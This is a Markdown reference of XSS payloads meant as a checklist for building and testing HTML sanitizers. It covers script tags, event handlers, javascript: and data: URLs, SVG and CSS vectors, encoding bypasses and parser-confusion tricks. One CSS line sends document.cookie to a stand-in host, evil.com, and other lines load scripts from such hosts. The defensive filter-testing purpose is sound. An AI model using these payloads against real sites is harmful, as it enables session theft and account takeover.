# Comprehensive XSS Vectors Reference

This document catalogs JavaScript injection vectors that must be handled when sanitizing HTML. Use this as a checklist to ensure comprehensive coverage.

## 1. Script Elements

### Basic Script Tags
```html
<script>alert(1)</script>
<script src="evil.js"></script>
<script type="text/javascript">alert(1)</script>
```

### Obfuscated Script Tags
```html
<ScRiPt>alert(1)</ScRiPt>
<script >alert(1)</script>
<script/src="evil.js">
<script\nsrc="evil.js">
```

## 2. Event Handler Attributes

### Mouse Events
```
onclick, ondblclick, onmousedown, onmouseup, onmouseover, onmousemove,
onmouseout, onmouseenter, onmouseleave, oncontextmenu, onwheel
```

### Keyboard Events
```
onkeydown, onkeyup, onkeypress
```

### Form Events
```
onfocus, onblur, onchange, onsubmit, onreset, onselect, oninput,
oninvalid, onsearch, onformdata
```

### Window/Document Events
```
onload, onerror, onabort, onbeforeunload, onunload, onresize, onscroll,
onhashchange, onpageshow, onpagehide, onpopstate, onstorage, onoffline,
ononline, onmessage, onvisibilitychange
```

### Media Events
```
onplay, onpause, onplaying, onprogress, onratechange, onseeked,
onseeking, onstalled, onsuspend, ontimeupdate, onvolumechange,
onwaiting, oncanplay, oncanplaythrough, ondurationchange, onemptied,
onended, onloadeddata, onloadedmetadata, onloadstart
```

### Drag Events
```
ondrag, ondragend, ondragenter, ondragleave, ondragover, ondragstart, ondrop
```

### Animation/Transition Events
```
onanimationstart, onanimationend, onanimationiteration,
ontransitionend, ontransitionstart, ontransitionrun, ontransitioncancel
```

### Clipboard Events
```
oncopy, oncut, onpaste
```

### Other Events
```
ontoggle, onshow, onauxclick, ongotpointercapture, onlostpointercapture,
onpointerdown, onpointermove, onpointerup, onpointercancel, onpointerover,
onpointerout, onpointerenter, onpointerleave, onsecuritypolicyviolation
```

### Event Handler Bypass Techniques
```html
<img src=x ONERROR=alert(1)>
<img src=x onerror = alert(1)>
<img src=x onerror	=	alert(1)>
<img src=x onerror
=alert(1)>
<body onpageshow=alert(1)>
```

## 3. JavaScript URL Schemes

### Basic JavaScript URLs
```html
<a href="javascript:alert(1)">click</a>
<a href="JavaScript:alert(1)">click</a>
<a href="javascript&#58;alert(1)">click</a>
<a href="javascript&#x3A;alert(1)">click</a>
<a href="  javascript:alert(1)">click</a>
<a href="java
script:alert(1)">click</a>
```

### Attributes That Accept URLs
```
href, src, action, formaction, data, poster, codebase, cite, background,
profile, usemap, longdesc, dynsrc, lowsrc, ping, manifest
```

### Data URL Attacks
```html
<a href="data:text/html,<script>alert(1)</script>">click</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
<object data="data:text/html,<script>alert(1)</script>">
<iframe src="data:text/html,<script>alert(1)</script>">
```

### VBScript URLs (IE-specific but worth blocking)
```html
<a href="vbscript:msgbox(1)">click</a>
```

## 4. Dangerous Elements

### Iframe Attacks
```html
<iframe src="javascript:alert(1)">
<iframe srcdoc="<script>alert(1)</script>">
<iframe src="data:text/html,<script>alert(1)</script>">
```

### Object/Embed Attacks
```html
<object data="javascript:alert(1)">
<object data="data:text/html,<script>alert(1)</script>">
<embed src="javascript:alert(1)">
<embed src="data:text/html,<script>alert(1)</script>">
```

### SVG Attacks
```html
<svg onload="alert(1)">
<svg><script>alert(1)</script></svg>
<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>
<svg><animate onbegin="alert(1)">
<svg><set onbegin="alert(1)">
<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
```

### MathML Attacks
```html
<math><maction actiontype="statusline#http://evil.com">click</maction></math>
```

### Base Tag Manipulation
```html
<base href="javascript:alert(1)//">
<base href="https://evil.com/">
```

### Meta Refresh Attacks
```html
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">
```

### Link Import Attacks
```html
<link rel="import" href="javascript:alert(1)">
<link rel="import" href="data:text/html,<script>alert(1)</script>">
```

### Form Attacks
```html
<form action="javascript:alert(1)"><input type="submit">
<input formaction="javascript:alert(1)" type="submit">
<button formaction="javascript:alert(1)">click</button>
```

## 5. CSS-Based Attacks

### Expression (IE-specific)
```html
<div style="width:expression(alert(1))">
<style>body{background:url(javascript:alert(1))}</style>
```

### Moz-Binding (Firefox-specific, deprecated)
```html
<div style="-moz-binding:url(evil.xml#xss)">
```

### Behavior (IE-specific)
```html
<div style="behavior:url(evil.htc)">
```

### Background URL Exfiltration
```html
<div style="background:url('https://evil.com/steal?cookie='+document.cookie)">
```

## 6. Encoding Bypass Techniques

### HTML Entity Encoding
```html
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">click</a>
```

### URL Encoding
```html
<a href="javascript%3Aalert(1)">click</a>
<a href="javascript%253Aalert(1)">click</a>
```

### Unicode Variations
```html
<a href="javascript\u003Aalert(1)">click</a>
<img src=x onerror="\u0061lert(1)">
```

### Null Byte Injection
```html
<script>al%00ert(1)</script>
<a href="java%00script:alert(1)">click</a>
```

### Mixed Encoding
```html
<a href="j&#x61;vascript:alert(1)">click</a>
<img src=x on&#x65;rror=alert(1)>
```

## 7. Parser Confusion Attacks

### Malformed Tags
```html
<script<script>>alert(1)</script>
<script "">alert(1)</script>
<script a=">'>" src="evil.js">
<img src="x` `<script>alert(1)</script>`">
```

### Comment-Based
```html
<!--><script>alert(1)</script>-->
<script><!--alert(1)--></script>
<script>alert(1)<!--</script>
```

### CDATA-Based
```html
<script><![CDATA[alert(1)]]></script>
<svg><script><![CDATA[alert(1)]]></script></svg>
```

### Namespace Confusion
```html
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
<math xmlns="http://www.w3.org/1998/Math/MathML"><script>alert(1)</script></math>
```

## 8. Template Injection

### Server-Side Template Indicators
```
{{constructor.constructor('alert(1)')()}}
${alert(1)}
<%= alert(1) %>
#{alert(1)}
```

## 9. Testing Checklist

When testing a filter, verify it handles:

- [ ] Basic `<script>` tags
- [ ] Script tags with various casings
- [ ] Script tags with whitespace variations
- [ ] All event handler attributes (not just common ones)
- [ ] Event handlers with whitespace around `=`
- [ ] `javascript:` URLs in all URL attributes
- [ ] `data:` URLs with HTML/JavaScript content
- [ ] Case variations of URL schemes
- [ ] Entity-encoded payloads
- [ ] URL-encoded payloads
- [ ] Null bytes and control characters
- [ ] Malformed HTML
- [ ] SVG with embedded scripts
- [ ] Iframe with srcdoc
- [ ] Form actions and formaction attributes
- [ ] Meta refresh redirects
- [ ] Style attributes with dangerous CSS
- [ ] Comments and CDATA sections
- [ ] Deeply nested malicious content

## 10. Safe Attribute Allowlist

When using an allowlist approach, these attributes are generally safe:

```
id, class, title, alt, name, placeholder, readonly, disabled, checked,
selected, multiple, size, maxlength, minlength, pattern, required,
autocomplete, autofocus, cols, rows, wrap, dir, lang, tabindex,
accesskey, contenteditable, draggable, hidden, spellcheck, translate,
role, aria-*, data-* (with sanitized values)
```

**Note:** Even "safe" attributes may require value sanitization to prevent attacks.
